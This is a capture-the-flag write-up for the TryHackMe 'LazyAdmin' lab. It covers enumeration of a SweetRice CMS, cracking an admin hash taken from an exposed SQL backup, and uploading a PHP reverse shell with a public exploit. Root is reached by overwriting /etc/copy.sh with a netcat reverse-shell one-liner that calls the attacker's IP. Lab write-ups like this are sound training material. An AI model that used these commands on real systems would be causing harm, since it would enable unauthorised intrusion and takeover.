# THM - LazyAdmin

## IP Address
10.10.131.164

## Write Up
1. do an Nmap scan.
```bash
#make a directory to store where you are going to store you nmap results
mkdir nmap
#scan for open ports and direct results to nmap/initial
nmap -p- -sV -sC -oN nmap/initial 10.10.131.164
```
2. The name results will result as shown:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-23 08:51 UTC
Nmap scan report for ip-10-10-131-164.eu-west-1.compute.internal (10.10.131.164)
Host is up (0.00078s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:DB:6B:30:7D:88 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.22 seconds
```

3. Port ```80/http``` is open. Navigating to it will lead you to a apache page.

4. Explore other potential directories with gobuster.
```bash
#install gobuster if you dont have it already
sudo apt install gobuster

#run gobuster with dirbuster wordlists
gobuster dir -u http://10.10.131.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

5. You will see that /content is available.
```bash
gobuster dir -u http://10.10.131.164 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

6. Going to http://10.10.131.164/content brings user to a sweetrice page but do not have much details as well. So we will run gobuster again on 10.10.131.164/content
```bash
gobuster dir -u http://10.10.131.164/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

7. You will realise that /content gives more output
```bash
/images (Status: 301)
/js (Status: 301)
/inc (Status: 301)
/as (Status: 301)
/_themes (Status: 301)
/attachment (Status: 301)
```

8. Running through the files you will realised there is this file over at /content/inc/lastest.txt shows ```1.5.1```. This may be the SweetRice version number.

9. Search for SweetRice Exploits.
```bash
searchsploit sweetrice
```

It will return a few exploits available under version ```1.5.1```. Main exploits are Arbitrary File Upload and PHP code execution.
```bash
---------------------------------- ----------------------------------------
 Exploit Title                    |  Path
                                  | (/usr/share/exploitdb/)
---------------------------------- ----------------------------------------
SweetRice 0.5.3 - Remote File Inc | exploits/php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulner | exploits/php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File  | exploits/php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File  | exploits/php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosu | exploits/php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Requ | exploits/php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Requ | exploits/php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' A | exploits/php/webapps/14184.txt
---------------------------------- ----------------------------------------
```

10. Now we need to find a username and password to run the 2 exploits. Looking further into the files at ```/content/inc``` you will come across an interesting SQL document under ```http://10.10.131.164/content/inc/mysql_backup/```. Download the SQL file and read it through:
```bash
cat Downloads/mysql_bakup_20191129023059-1.5.1.sql 
```

You will notice the PHP code along with the hashed password and username:
```bash
  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"
```

11. Run the hashed password over at [CrackStation](https://crackstation.net/) and you will get the password for user ```manager```.
```manager:Password123```

12. go to ```/content/as``` and login with the username and password to verify. Once logged in, start the website.

## Creating Reverse Shell

13. We are now going to use the 2 exploits found earlier. We can either upload the code in the dashboard > ads or we can use a python script to do the uploading.
- [SweetRice 1.5.1 - Arbitrary File Upload Script](https://www.exploit-db.com/exploits/40716)

14. We will also need to create our reverse shell and create a few ext to see which extension SweetRice will accept. In this CTF, .php5 will work.
- [Php Reverse Shell Code](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

You will need to edit part of the scripts. You will need to get your ip addr and edit the IP and PORT section of the code.
```bash
root@kali:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:40:bb:15:91:a0 brd ff:ff:ff:ff:ff:ff
    inet 10.10.141.19/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3365sec preferred_lft 3365sec
    inet6 fe80::40:bbff:fe15:91a0/64 scope link 
       valid_lft forever preferred_lft forever
```

We will use ```10.10.141.19``` and port ```9001``` (you can choose your own port no.) and edit the following in the PHP script:

```bash
...
$ip = '10.10.141.19';  // CHANGE THIS
$port = 9001;       // CHANGE THIS
...
```

15. Now open another terminal and start listing to port ```9001``` before uploading the php script.
```bash
nc -lvnp 9001
```

16. Run the python script exploit and click on the links to gain shell access.
```bash
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |                                                    
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+

Enter The Target URL(Example : localhost.com) : 10.10.131.164/content
Enter Username : manager
Enter Password : Password123
Enter FileName (Example:.htaccess,shell.php5,index.html) : reshell.php5
[+] Sending User&Pass...
[+] Login Succssfully...
[+] File Uploaded...
[+] URL : http://10.10.131.164/content/attachment/reshell.php5
root@kali:~# 
```
Listening Terminal
```bash
root@kali:~# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.141.19] from (UNKNOWN) [10.10.131.164] 44340
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 12:43:17 up  1:05,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Gaining a Stable Shell

17. we will now attempt to gain a stable shell.
- type the following:
```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

- press ```ctrl+z``` to bring shell to foreground

- type:
```bash
stty raw -echo
fg
```

- press ```Enter``` a few times to get back the shell

- type:
```bash
export TERM=xterm
```

- press ```crtl+l``` to get a clean and stable shell.

## Finding users and flags

18. We will now see what users are there in this shell.
```bash
cat /etc/passwd | grep /bin/bash
```

You will see a user called ```itguy```.
```bash
www-data@THM-Chal:/$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
itguy:x:1000:1000:THM-Chal,,,:/home/itguy:/bin/bash
guest-3myc2b:x:998:998:Guest:/tmp/guest-3myc2b:/bin/bash
```

we can move to the itguy directory and capture our first flag.
```bash
cd /home/itguy
cat user.txt
```

## Privilege Escalation
19. by typing ```ls -l``` you will realised you have a read/write access to the ```backup.pl``` perl script.
```bash
www-data@THM-Chal:/home/itguy$ ls -l
total 56
drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Desktop
drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Documents
drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:35 Downloads
drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Music
drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Pictures
drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Public
drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Templates
drwxr-xr-x 2 itguy itguy 4096 Nov 29 11:26 Videos
-rw-r--r-x 1 root  root    47 Nov 29 13:09 backup.pl
-rw-r--r-- 1 itguy itguy 8980 Nov 29 00:35 examples.desktop
-rw-rw-r-- 1 itguy itguy   16 Nov 29 12:35 mysql_login.txt
-rw-rw-r-- 1 itguy itguy   38 Nov 29 12:33 user.txt
```

- You will also notice we can run as root aka ```sudo``` for backup.pl through ```sudo -l```
```bash
www-data@THM-Chal:/home/itguy$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/home/itguy$ 
```

- reading the perl script through ```cat backup.pl```
```bash
www-data@THM-Chal:/home/itguy$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

- it redirect and run a copy.sh script. Lets take a look at whats inside ```copy.sh```
```bash
www-data@THM-Chal:/home/itguy$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```
- It is basically another reverse shell script. We will have to redirect the reverse shell to ourselves. But this server has no vi or vim. So we will do it through ```echo > copy.sh```
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.141.19 9002 >/tmp/f" > /etc/copy.sh
```
20. We will run nc listener at port 9002 now with at a new terminal:
```bash
nc -lvnp 9002
```
- in the ```itguy``` terminal, run the perl script.
```bash
sudo /usr/bin/perl /home/itguy/backup.pl
```

- You will gain root access at your new terminal:
```bash
root@kali:~# nc -lvnp 9002
listening on [any] 9002 ...
connect to [10.10.141.19] from (UNKNOWN) [10.10.131.164] 54636
# 
```

21. You can gain stable shell as above or just get the root.txt file
```bash
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
```
